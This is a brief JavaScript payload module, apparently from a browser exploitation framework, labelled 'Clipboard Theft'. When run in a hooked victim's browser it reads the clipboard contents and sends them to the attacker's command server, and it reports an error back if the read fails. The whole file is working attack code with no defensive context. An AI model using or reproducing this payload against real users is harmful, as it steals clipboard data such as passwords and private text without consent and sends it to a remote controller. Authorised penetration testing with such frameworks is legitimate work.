//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {
  try {
    var clipboard = clipboardData.getData("Text");
    server.debug("[Clipboard Theft] Success: Retrieved clipboard contents (" + clipboard.length + ' bytes)');
    server.net.send("<%= @command_url %>", <%= @command_id %>, "clipboard="+clipboard, server.are.status_success());
  } catch (e) {
    server.debug("[Clipboard Theft] Error: Could not retrieve clipboard contents");
    server.net.send("<%= @command_url %>", <%= @command_id %>, "fail=clipboardData.getData is not supported.", server.are.status_error());
  }
});
